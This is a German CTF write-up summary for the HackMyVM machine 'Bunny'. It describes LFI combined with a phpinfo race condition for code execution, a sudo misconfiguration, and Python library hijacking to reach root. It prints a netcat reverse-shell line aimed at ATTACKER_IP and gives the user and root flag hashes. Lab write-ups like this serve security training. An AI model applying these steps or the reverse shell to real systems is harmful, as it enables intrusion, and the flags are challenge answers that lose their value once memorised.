# Bunny - HackMyVM (Hard)

![Bunny Icon](Bunny.png)

## Übersicht

*   **VM:** Bunny
*   **Plattform:** [HackMyVM](https://hackmyvm.eu/machines/machine.php?vm=Bunny)
*   **Schwierigkeit:** Hard
*   **Autor der VM:** DarkSpirit
*   **Datum des Writeups:** 2022-10-17
*   **Original-Writeup:** [alientec1908.github.io](https://alientec1908.github.io/Bunny_HackMyVM_Hard/) (Autor: Ben C.)

## Kurzbeschreibung

Die virtuelle Maschine "Bunny" von HackMyVM (Schwierigkeitsgrad: Hard) offenbarte mehrere kritische Schwachstellen. Dieses Writeup dokumentiert den Weg von der initialen Enumeration über die Ausnutzung einer Local File Inclusion (LFI) in Kombination mit einer exponierten `phpinfo.php` zur Remote Code Execution, bis hin zur vollständigen Systemkompromittierung (Root-Zugriff) durch unsichere `sudo`-Konfigurationen und Python Library Hijacking.

## Disclaimer / Wichtiger Hinweis

Die in diesem Writeup beschriebenen Techniken und Werkzeuge dienen ausschließlich zu Bildungszwecken im Rahmen von legalen Capture-The-Flag (CTF)-Wettbewerben und Penetrationstests auf Systemen, für die eine ausdrückliche Genehmigung vorliegt. Die Anwendung dieser Methoden auf Systeme ohne Erlaubnis ist illegal. Der Autor übernimmt keine Verantwortung für missbräuchliche Verwendung der hier geteilten Informationen. Handeln Sie stets ethisch und verantwortungsbewusst.

## Verwendete Tools

*   `arp-scan`
*   `nmap`
*   `gobuster`
*   `curl`
*   `wfuzz`
*   `hydra`
*   `nano`
*   `python` / `python2` / `python3`
*   `nc` (netcat)
*   `stty`
*   `sudo`
*   `ls`, `cat`, `id`, `find`, `head`, `mktemp`, `zip`, `grep`
*   Privilege Escalation Enumeration Skripte (z.B. `linpeas.sh`, etc.)

## Lösungsweg (Zusammenfassung)

Der Angriff auf die Maschine "Bunny" gliederte sich in folgende Phasen:

1.  **Reconnaissance:**
    *   Identifizierung der Ziel-IP (`192.168.2.154`) mittels `arp-scan`.
    *   Portscan mit `nmap` offenbarte offene Ports: 22 (SSH - OpenSSH 7.9p1) und 80 (HTTP - Apache 2.4.38).

2.  **Web Enumeration & LFI:**
    *   `gobuster` fand diverse interessante Dateien auf dem Webserver: `index.php`, `upload.php`, `password.txt` (Ablenkungsmanöver mit ASCII-Art), `config.php` und `phpinfo.php`.
    *   `wfuzz` identifizierte eine Local File Inclusion (LFI) Schwachstelle im `page`-Parameter der `index.php`.
    *   Bestätigung der LFI durch Auslesen von `/etc/passwd`, was die Benutzer `root` und `chris` offenbarte. Versuche, SSH-Keys über LFI auszulesen, scheiterten.

3.  **Initial Access (LFI + PHPInfo Exploit):**
    *   SSH Brute-Force Versuche auf den Benutzer `chris` mit `hydra` blieben erfolglos.
    *   Die Kombination aus der LFI-Schwachstelle und der exponierten `phpinfo.php` wurde genutzt.
    *   Mittels des Skripts `phpinfolfi.py` (von Insomniasec) wurde eine Race Condition ausgenutzt:
        1.  Eine PHP-Reverse-Shell wurde via POST-Request an `phpinfo.php` gesendet.
        2.  Der temporäre Dateiname dieser Shell wurde aus der `phpinfo()`-Ausgabe extrahiert.
        3.  Dieser temporäre Pfad wurde schnell an die LFI-Schwachstelle in `index.php?page=` übergeben, um die Shell auszuführen, bevor sie gelöscht wird.
    *   Erfolgreiche Etablierung einer Reverse Shell als Benutzer `www-data`.
    *   Stabilisierung der Shell mittels Python (`pty.spawn`) und `stty`.

4.  **Privilege Escalation (www-data zu chris):**
    *   `sudo -l` zeigte, dass der Benutzer `www-data` das Skript `/home/chris/lab/magic` als Benutzer `chris` ohne Passwort ausführen darf (`(chris) NOPASSWD: /bin/bash /home/chris/lab/magic`).
    *   Das Skript `magic` schien seine Argumente als Befehle auszuführen.
    *   Durch Ausführen von `sudo -u chris /bin/bash /home/chris/lab/magic <beliebiger_befehl_oder_trick>` (im Writeup `zip $(mktemp -u) /etc/hosts`) wurde eine Shell als Benutzer `chris` erlangt.
    *   Stabilisierung der Shell als `chris` und Auslesen der User-Flag.

5.  **Privilege Escalation (chris zu root):**
    *   `sudo -l` für `chris` erforderte ein Passwort.
    *   Suche nach SUID-Binaries (`find / -perm -u=s -type f 2>/dev/null`) und weitere Enumeration (z.B. mit `linpeas.sh`) sind hier typische Schritte.
    *   Analyse des Python-Skripts `/opt/pendu.py` (gehört `root:root`), das das `random`-Modul importiert.
    *   Die Standard-Python-Bibliotheksdatei `/usr/lib/python3.7/random.py` war **weltbeschreibbar** (`-rw-r--rw-`).
    *   **Python Library Hijacking:**
        1.  Ein Netcat-Listener wurde auf der Angreifer-Maschine gestartet.
        2.  Am Anfang der Datei `/usr/lib/python3.7/random.py` wurde Code für eine Reverse Shell (`os.system("nc -e /bin/bash ATTACKER_IP 555")`) eingefügt.
        3.  Sobald ein Prozess (vermutlich ein Cronjob, der `/opt/pendu.py` ausführt) als `root` das manipulierte `random`-Modul importierte, wurde die Reverse Shell ausgeführt.
    *   Erfolgreiche Etablierung einer Reverse Shell als `root`.
    *   Auslesen der Root-Flag.

## Wichtige Schwachstellen und Konzepte

*   **Local File Inclusion (LFI):** Ausnutzung des `page`-Parameters in `index.php`.
*   **PHPInfo Exposure & Race Condition:** Kombination von LFI mit einer exponierten `phpinfo.php` zur Offenlegung temporärer Dateipfade und anschließender Remote Code Execution (RCE) durch eine Race Condition.
*   **Unsichere `sudo`-Konfiguration:** Erlaubte `www-data` die Ausführung eines Skripts als `chris` ohne Passwort, was zur Rechteausweitung führte.
*   **Python Library Hijacking:** Eine weltbeschreibbare Python-Standardbibliothek ermöglichte das Einschleusen von Schadcode, der bei Import durch ein als `root` laufendes Skript ausgeführt wurde.
*   **Irreführende Dateinamen:** `password.txt` enthielt keine Passwörter, sondern ASCII-Kunst.
*   **Privilege Escalation Enumeration:** Systematische Suche nach Schwachstellen zur Rechteausweitung.

## Flags

*   **User Flag (`/home/chris/user.txt`):** `b9c1575e8d8f934a4101fdbec2f711fe`
*   **Root Flag (`/root/root.txt`):** `536313923133fb4a628f8ddd5e0ed3e5`

## Tags

`HackMyVM`, `Bunny`, `Hard`, `LFI`, `PHPInfo`, `Race Condition`, `RCE`, `Sudo Privilege Escalation`, `Python Library Hijacking`, `Web`, `Linux`, `Privilege Escalation`, `Enumeration`
